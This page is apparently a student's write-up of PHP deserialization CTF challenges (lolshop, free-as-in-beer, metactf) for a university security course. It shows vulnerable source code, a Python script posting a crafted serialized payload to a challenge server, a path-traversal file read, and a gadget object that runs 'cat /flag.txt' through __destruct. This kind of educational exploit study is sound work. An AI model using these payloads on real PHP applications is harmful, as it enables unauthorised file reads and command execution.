<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="turbo-root" content="/odc">
    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="2.4.0.726929371677">

    <!-- See retype.com -->
    <meta name="generator" content="Retype 2.4.0">

    <!-- Primary Meta Tags -->
    <title>Serialization</title>
    <meta name="title" content="Serialization">
    <meta name="description" content="We wanto to exploit the restore function, since it has a vulnerability which can allow execution of non serialized malicious code." />

    <!-- Canonical -->
    <link rel="canonical" href="https://francesco-plt.github.io/odc/06-serialization/" />

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://francesco-plt.github.io/odc/06-serialization/">
    <meta property="og:title" content="Serialization">
    <meta property="og:description" content="We wanto to exploit the restore function, since it has a vulnerability which can allow execution of non serialized malicious code.">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://francesco-plt.github.io/odc/06-serialization/">
    <meta property="twitter:title" content="Serialization">
    <meta property="twitter:description" content="We wanto to exploit the restore function, since it has a vulnerability which can allow execution of non serialized malicious code.">

    <script>(function () { var el = document.documentElement, m = localStorage.getItem("/odc/doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>

    <link href="../resources/css/retype.css?v=2.4.0.726929371677" rel="stylesheet" />

    <script type="text/javascript" src="../resources/js/config.js?v=2.4.0.726929371677" data-turbo-eval="false" defer></script>
    <script type="text/javascript" src="../resources/js/retype.js?v=2.4.0" data-turbo-eval="false" defer></script>
    <script id="lunr-js" type="text/javascript" src="../resources/js/lunr.js?v=2.4.0.726929371677" data-turbo-eval="false" defer></script>
    <script id="prism-js" type="text/javascript" src="../resources/js/prism.js?v=2.4.0.726929371677" defer></script>
</head>
<body>
    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
    
        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
            <div class="container relative flex items-center justify-between grow pr-6 md:justify-start">
                <!-- Mobile menu button skeleton -->
                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
                <div v-cloak id="docs-sidebar-toggle"></div>
        
                <!-- Logo -->
                <div class="flex items-center justify-between h-full py-2 md:w-75">
                    <div class="flex items-center px-2 md:px-6">
                        <a id="docs-site-logo" href="../" class="flex items-center leading-snug text-xl">
                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">Offensive and Defensive Cybersecurity</span>
                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">Challenges summary &amp; write-up</span>
                    </div>
        
                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
                </div>
        
                <div class="flex justify-between md:grow">
                    <!-- Top Nav -->
                    <nav class="hidden md:flex">
                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/francesco-plt/">My GitHub</a>
                            </li>
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://webeep.polimi.it/course/view.php?id=2636">Course Page on Webeep</a>
                            </li>
        
                        </ul>
                    </nav>
        
                    <!-- Header Right Skeleton -->
                    <div v-cloak class="flex justify-end grow skeleton">
        
                        <!-- Search input mock -->
                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                            </div>
        
                            <input class="w-full h-10 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 placeholder-gray-400 dark:placeholder-dark-400"
                            style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search" />
                        </div>
        
                        <!-- Mobile search button mock -->
                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                        </div>
        
                        <!-- Dark mode switch placehokder -->
                        <div class="w-10 h-10 lg:ml-2"></div>
        
                        <!-- History button mock -->
                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation"  style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
                        </div>
                    </div>
        
                    <div v-cloak class="flex justify-end grow">
                        <div id="docs-mobile-search-button"></div>
                        <doc-search-desktop></doc-search-desktop>
        
                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
                        <doc-history></doc-history>
                    </div>
                </div>
            </div>
        </header>
    
        <div class="container relative flex bg-white">
            <!-- Sidebar Skeleton -->
            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
            
                <!-- Render this div, if config.showSidebarFilter is `true` -->
                <div class="flex items-center h-16 px-6">
                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter" />
                </div>
            
                <div class="pl-6 mb-4 mt-1">
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                </div>
            
                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                        <span class="text-xs whitespace-nowrap">Powered by</span>
                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                    </a>
                </div>
            </div>
            
            <!-- Sidebar component -->
            <doc-sidebar v-cloak>
                <template #sidebar-footer>
                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
            
                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
                            <nav>
                                <ul class="flex flex-wrap justify-center items-center">
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/francesco-plt/">My GitHub</a>
                                    </li>
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://webeep.polimi.it/course/view.php?id=2636">Course Page on Webeep</a>
                                    </li>
            
                                </ul>
                            </nav>
                        </div>
            
                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                            <span class="text-xs whitespace-nowrap">Powered by</span>
                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                        </a>
                    </div>
                </template>
            </doc-sidebar>
    
            <div class="grow min-w-0 dark:bg-dark-850">
                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                <div class="flex">
                    <div class="grow min-w-0 px-6 md:px-16">
                        <main class="relative pt-6 pb-16">
                            <div class="docs-markdown" id="docs-content">
                                <!-- Rendered if sidebar right is enabled -->
                                <div id="docs-sidebar-right-toggle"></div>
                
                                <!-- Page content  -->
<doc-anchor-target id="serialization" class="break-words">
    <h1>
        <doc-anchor-trigger class="header-anchor-trigger" to="#serialization">#</doc-anchor-trigger>
        <span>Serialization</span>
    </h1>
</doc-anchor-target>
<doc-anchor-target id="lolshop">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#lolshop">#</doc-anchor-trigger>
        <span>lolshop</span>
    </h2>
</doc-anchor-target>
<p>We wanto to exploit the <code v-pre>restore</code> function, since it has a vulnerability which can allow execution of non serialized malicious code. Ideally we would also like to exploit the <code v-pre>getPicture</code> function in <code v-pre>products.php</code>, since it has an hardcoded path into it. Note that it is also called into a <code v-pre>toDict</code> function.</p>
<p>To recap: we need to read the secret file. We have a compressed internal state variable, which we would like to decode. It is send back and forth via requests and it is encoded in base 64:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-python"><code v-pre class="language-python">import zlib
zlib.decompress(state)</code></pre>
</doc-codeblock></div>
<p>The result is a php serialized object. We can inject anything we want into it. We need another class / more than on class to get a print of the secret file present in the server&#x27;s file system.</p>
<doc-anchor-target id="in-a-nutshell">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#in-a-nutshell">#</doc-anchor-trigger>
        <span>In a nutshell</span>
    </h3>
</doc-anchor-target>
<p>If we send a product instead of a state, the <code v-pre>toDict</code> of the product is going to be called. The output will contain the <code v-pre>getPicture</code> function, which will read from the filesystem the path we want, which will be the secret file. Code for that:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-python"><code v-pre class="language-python">import zlib, base64, requests, subprocess
from IPython import embed

obj = subprocess.check_output(['php', 'payload.php'])
payload = base64.b64encode(zlib.compress(obj))
print('encoded payload: {}'.format(payload.decode('utf-8')))

print('sending payload...')
r = requests.post(&quot;http://jinblack.it:3006/api/cart.php&quot;, data={
  'state': payload
})
print('status code: {}'.format(r))
embed()</code></pre>
</doc-codeblock></div>
<p>What do we put in the <code v-pre>payload.php</code> script? The quickest way to generate the PHP code is to use the php shell (<code v-pre>php -a</code>):</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-php"><code v-pre class="language-php">php &gt; ...
php &gt; $p = new Product(0, 'xcv', 'xcv', '../../../../secret/flag.txt', 0);
php &gt; echo serialize($p);</code></pre>
</doc-codeblock></div>
<p>In the first line we copied into the console all the class code from the website source code.</p>
<p><strong>Note:</strong> HTTP status code 500 means internal serve error. It is good, since it means that there&#x27;s something wrong that we can exploit.</p>
<doc-anchor-target id="free-as-in-beer">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#free-as-in-beer">#</doc-anchor-trigger>
        <span>free-as-in-beer</span>
    </h2>
</doc-anchor-target>
<p>We do not have any source code... We just have the url of the challenge, and some hints: we know that the flag is contained in the <code v-pre>flag.php</code> file, and that we&#x27;ll probably find some exploitable code if we look carefully. In fact we can find some PHP source code in plain text:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-php"><code v-pre class="language-php">*/?&gt;&lt;?php

Class GPLSourceBloater{
    public function __toString()
    {
        return highlight_file('license.txt', true).highlight_file($this-&gt;source, true);
    }
}


if(isset($_GET['source'])){
    $s = new GPLSourceBloater();
    $s-&gt;source = __FILE__;

    echo $s;
    exit;
}

$todos = [];

if(isset($_COOKIE['todos'])){
    $c = $_COOKIE['todos'];
    $h = substr($c, 0, 32);
    $m = substr($c, 32);

    if(md5($m) === $h){
        $todos = unserialize($m);
    }
}

if(isset($_POST['text'])){
    $todo = $_POST['text'];

    $todos[] = $todo;
    $m = serialize($todos);
    $h = md5($m);

    setcookie('todos', $h.$m);

    header('Location: '.$_SERVER['REQUEST_URI']);
    exit;
}

?&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;style&gt;
    * {font-family: &quot;Comic Sans MS&quot;, cursive, sans-serif}
    &lt;/style&gt;
&lt;/head&gt;

&lt;h1&gt;My open/libre/free/PHP/Linux/systemd/GNU TODO List&lt;/h1&gt;
&lt;a href=&quot;?source&quot;&gt;&lt;h2&gt;It's super secure, see for yourself&lt;/h2&gt;&lt;/a&gt;
&lt;ul&gt;
&lt;?php foreach($todos as $todo):?&gt;
    &lt;li&gt;&lt;?=$todo?&gt;&lt;/li&gt;
&lt;?php endforeach;?&gt;
&lt;/ul&gt;

&lt;form method=&quot;post&quot; href=&quot;.&quot;&gt;
    &lt;textarea name=&quot;text&quot;&gt;&lt;/textarea&gt;
    &lt;input type=&quot;submit&quot; value=&quot;store&quot;&gt;
&lt;/form&gt;</code></pre>
</doc-codeblock></div>
<p>I&#x27;m a bit of a novice in PHP, so let&#x27;s look more carefully at what we&#x27;re dealing with. Here&#x27;s some notes:</p>
<ul>
<li>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-php"><code v-pre class="language-php">substr(string $string, int $offset, ?int $length = null): string</code></pre>
</doc-codeblock></div>
<p>Returns the portion of <code v-pre>string</code> specified by the <code v-pre>offset</code> and <code v-pre>length</code> parameters.</p>
</li>
<li>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-php"><code v-pre class="language-php">md5(string $string, bool $binary = false): string</code></pre>
</doc-codeblock></div>
<p>Calculates the MD5 hash of <code v-pre>string</code> using the <a href="http://www.faqs.org/rfcs/rfc1321">» RSA Data Security, Inc. MD5 Message-Digest Algorithm</a>, and returns that hash.</p>
</li>
<li><p><a href="http://us2.php.net/manual/en/language.constants.predefined.php"><code v-pre>__FILE__</code></a> is a magic constant that gives you the filesystem path to the current .php file (the one that <code v-pre>__FILE__</code> is in, not the one it&#x27;s included by if it&#x27;s an include.</p>
</li>
<li><p><code v-pre>REQUEST_URI</code>: The URI which was given in order to access this page; for instance, &#x27;<code v-pre>/index.html</code>&#x27;.</p>
</li>
<li>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-php"><code v-pre class="language-php">header(string $header, bool $replace = true, int $response_code = 0): void</code></pre>
</doc-codeblock></div>
<p><strong>header()</strong> is used to send a raw HTTP header. See the <a href="http://www.faqs.org/rfcs/rfc2616">» HTTP/1.1 specification</a> for more information on HTTP headers.</p>
</li>
</ul>
<doc-anchor-target id="a-first-approach">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#a-first-approach">#</doc-anchor-trigger>
        <span>A first approach</span>
    </h3>
</doc-anchor-target>
<p>This is the exploitable part of the code, leaked in the html of the page:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-php"><code v-pre class="language-php">Class GPLSourceBloater{
    public function __toString()
    {
        return highlight_file('license.txt', true).highlight_file($this-&gt;source, true);
    }
}


if(isset($_GET['source'])){
    $s = new GPLSourceBloater();
    $s-&gt;source = __FILE__;

    echo $s;
    exit;
}</code></pre>
</doc-codeblock></div>
<p><strong>PHP magic methods recall</strong></p>
<p>Recall on magic methods such as <code v-pre>__toString</code>:</p>
<blockquote>
<p>Magic methods are special methods which override PHP&#x27;s default&#x27;s action when certain actions are performed on an object.</p>
<p><strong>Caution</strong></p>
<p>All methods names starting with <code v-pre>__</code> are reserved by PHP. Therefore, it is not recommended to use such method names unless overriding PHP&#x27;s behavior.</p>
<p>...</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-php"><code v-pre class="language-php">public __toString(): string</code></pre>
</doc-codeblock></div>
<p>The <a href="https://www.php.net/manual/en/language.oop5.magic.php#object.tostring">__toString()</a> method allows a class to decide how it will react when it is treated like a string. For example, what <code v-pre>echo $obj;</code> will print.</p>
<p>Source: <a href="https://www.php.net/manual/en/language.oop5.magic.php">PHP: Magic Methods - Manual</a></p>
</blockquote>
<p><strong>To recap</strong></p>
<p>Basically we need to serialize an instance of the <code v-pre>GPLSourceBloater</code> class with the <code v-pre>source</code> variable setted as <code v-pre>flag.php</code>. To achieve that we create the object, serialize it, and put it in the <code v-pre>todos</code> array. After that it&#x27;s just a matter of sending a GET to the server with our custom cookie and the flag will be printed.</p>
<doc-anchor-target id="metactf">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#metactf">#</doc-anchor-trigger>
        <span>metactf</span>
    </h2>
</doc-anchor-target>
<p>More complex than free-as-in-beer. We have two classes: <code v-pre>User</code> and <code v-pre>Challenge</code>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-php"><code v-pre class="language-php">&lt;?php
// ini_set('display_errors', 1);
// ini_set('display_startup_errors', 1);
// error_reporting(E_ALL);
// error_reporting(0);

class User{
  public $name;
  public $id;
  public $isAdmin;
  public $solved;
  public $points;

  function __construct($id, $name){
    $this-&gt;id = $id;
    $this-&gt;name = $name;
    $this-&gt;isAdmin = false;
    $this-&gt;solved = array();
    $this-&gt;points = 0;

  }

  function setSolved($challid){
    array_push($this-&gt;solved, $challid);
  }

}

class Challenge{
  //WIP Not used yet.
  public $name;
  public $description;
  public $setup_cmd=NULL;
  // public $check_cmd=NULL;
  public $stop_cmd=NULL;

  function __construct($name, $description){
    $this-&gt;name = $name;
    $this-&gt;description = $description;
  }

  function start(){
    if(!is_null($this-&gt;setup_cmd)){
      $output=null;
      $retval=null;
      echo(&quot;Starting challenge!&quot;);
      exec($this-&gt;setup_cmp, $output, $retval);
      echo($output[0]);
    }
  }

  function stop(){
    if(!is_null($this-&gt;stop_cmd)){
      $output=null;
      $retval=null;
      echo(&quot;Stoping challenge!&quot;);
      exec($this-&gt;stop_cmd, $output, $retval);
      echo($output[0]);
    }
  }

  function __destruct(){
    $this-&gt;stop();
  }
}
?&gt;</code></pre>
</doc-codeblock></div>
<p>We can both download and upload user objects: those get serialized before being downloaded, and unserialized after being uploaded. Since the web app hasn&#x27;t got any user input validation/sanitization, we can put everything we want into the user object.</p>
<p><strong>About user objects</strong></p>
<p>Here&#x27;s what we get if we create a user and download its serialized object:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-php"><code v-pre class="language-php">O:4:&quot;User&quot;:5:{s:4:&quot;name&quot;;s:3:&quot;zzz&quot;;s:2:&quot;id&quot;;i:6904;s:7:&quot;isAdmin&quot;;b:0;s:6:&quot;solved&quot;;a:0:{}s:6:&quot;points&quot;;i:0;}%</code></pre>
</doc-codeblock></div>
<p>Which becomes:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-php"><code v-pre class="language-php">object(User)#1 (5) {
  [&quot;name&quot;]=&gt;
  string(3) &quot;zzz&quot;
  [&quot;id&quot;]=&gt;
  int(6904)
  [&quot;isAdmin&quot;]=&gt;
  bool(false)
  [&quot;solved&quot;]=&gt;
  array(0) {
  }
  [&quot;points&quot;]=&gt;
  int(0)
}</code></pre>
</doc-codeblock></div>
<p><strong>Note about <code v-pre>fetch_assoc()</code></strong></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-php"><code v-pre class="language-php">$info = $res-&gt;fetch_assoc();
$isadmin = $info['isadmin'] == 1;
$res-&gt;close();
return $isadmin;</code></pre>
</doc-codeblock></div>
<p>It is used to fetch a result row as an associative array.</p>
<p><strong>Magic methods in this challenge</strong></p>
<ul>
<li><code v-pre>__construct</code>: If you create a <code v-pre>__construct()</code> function, PHP will automatically call this function when you create an object from a class.</li>
<li><code v-pre>__destruct</code>: If you create a <code v-pre>__destruct()</code> function, PHP will automatically call this function at the end of the script. This is the method we&#x27;ll exploit to leak the flag.</li>
</ul>
<doc-anchor-target id="a-first-approach-1">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#a-first-approach-1">#</doc-anchor-trigger>
        <span>A first approach</span>
    </h3>
</doc-anchor-target>
<p>I tried downloading the default user object created by the website, changing the number of points and setting <code v-pre>isAdmin</code> to <code v-pre>true</code>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-php"><code v-pre class="language-php">$ php user.php
object(User)#1 (5) {
  [&quot;name&quot;]=&gt;
  string(3) &quot;123&quot;
  [&quot;id&quot;]=&gt;
  int(0)
  [&quot;isAdmin&quot;]=&gt;
  bool(true)
  [&quot;solved&quot;]=&gt;
  array(0) {
  }
  [&quot;points&quot;]=&gt;
  int(999)
}
O:4:&quot;User&quot;:5:{s:4:&quot;name&quot;;s:3:&quot;123&quot;;s:2:&quot;id&quot;;i:0;s:7:&quot;isAdmin&quot;;b:1;s:6:&quot;solved&quot;;a:0:{}s:6:&quot;points&quot;;i:999;}</code></pre>
</doc-codeblock></div>
<p><del>Thanks to that I managed to print a test challenge in the homepage of the app</del> Actually this is not true, as you&#x27;ll see later on:</p>
<blockquote>
<doc-anchor-target id="welcome-to-metactf">
    <h1>
        <doc-anchor-trigger class="header-anchor-trigger" to="#welcome-to-metactf">#</doc-anchor-trigger>
        <span>Welcome to METACTF</span>
    </h1>
</doc-anchor-target>
<p>Name: Test Challenge</p>
<p>Desc: This is an enabled test challenge</p>
<p>Points: 100</p>
</blockquote>
<p>The code above gets printed for every user, admin or not.</p>
<doc-anchor-target id="the-solution">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#the-solution">#</doc-anchor-trigger>
        <span>The solution</span>
    </h3>
</doc-anchor-target>
<p>Since in the code of the <code v-pre>Challenge</code> class we can execute arbitrary shell commands, we could try executing <code v-pre>cat /flag.txt</code>. First we need to instantiate a new object, which we did (Test Challenge). Then we need to delete it, which will call the <code v-pre>__destruct()</code> magic method, which will call the <code v-pre>stop()</code> function. If we previously set <code v-pre>$c-&gt;stop_cmp = 'cat /flag.txt'</code>, we should be all set. Still we need a way to manipulate the object...</p>
<p><strong><code v-pre>array_push()</code></strong></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-php"><code v-pre class="language-php">array_push(array &amp;$array, mixed ...$values): int</code></pre>
</doc-codeblock></div>
<p><strong>array_push()</strong> treats <code v-pre>array</code> as a stack, and pushes the passed variables onto the end of <code v-pre>array</code>. The length of <code v-pre>array</code> increases by the number of variables pushed. Has the same effect as:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-php"><code v-pre class="language-php">&lt;?php
$array[] = $var;
?&gt;</code></pre>
</doc-codeblock></div>
<p><strong><code v-pre>exec</code> in PHP</strong></p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-php"><code v-pre class="language-php">exec(string $command, array &amp;$output = null, int &amp;$result_code = null): string|false</code></pre>
</doc-codeblock></div>
<ul>
<li><code v-pre>command</code>: The command that will be executed.</li>
<li><code v-pre>output</code>: If the <code v-pre>output</code> argument is present, then the specified array will be filled with every line of output from the command. Trailing whitespace, such as <code v-pre>\n</code>, is not included in this array. Note that if the array already contains some elements, <strong>exec()</strong> will append to the end of the array. If you do not want the function to append elements, call <a href="https://www.php.net/manual/en/function.unset.php">unset()</a> on the array before passing it to <strong>exec()</strong>.</li>
<li><code v-pre>result_code</code>: If the <code v-pre>result_code</code> argument is present along with the <code v-pre>output</code> argument, then the return status of the executed command will be written to this variable.</li>
</ul>
<p><strong>To recap</strong></p>
<p>We just needed to serialize a specially crafted <code v-pre>Challenge</code> object and to put it into the file that would be uploaded...</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-php"><code v-pre class="language-php">$c = new Challenge('bogus challenge', &quot;just trying to print the flag, nothing to see here&quot;);
$c-&gt;stop_cmd = 'cat /flag.txt';
print(serialize($c));</code></pre>
</doc-codeblock></div>
<p>Then, after uploading this, we load <code v-pre>index.php</code> and we&#x27;ll get:</p>
<blockquote>
<doc-anchor-target id="welcome-to-metactf-1">
    <h1>
